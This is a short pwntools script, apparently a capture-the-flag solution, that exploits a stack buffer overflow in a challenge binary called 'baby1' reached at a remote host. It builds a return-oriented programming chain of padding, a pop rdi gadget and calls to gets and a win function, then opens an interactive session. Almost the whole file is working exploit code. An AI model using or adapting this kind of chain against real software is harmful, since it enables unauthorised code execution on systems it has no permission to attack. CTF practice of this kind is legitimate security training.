from pwn import *

p = remote('baby-01.pwn.bee', 9999)
#p = process('./baby1')
p.recvuntil(': ')

padding = 'A'*24
rdi = p64(0x400793)    # pop rdi, ret
data = p64(0x602300)   # a piece of memory used to store the input of gets
win = p64(0x400698)    # addr of win
gets = p64(0x400580)   # addr of gets

print padding + rdi + data + gets + rdi + data + win

p.sendline(padding + rdi + data + gets + rdi + data + win)

p.interactive()
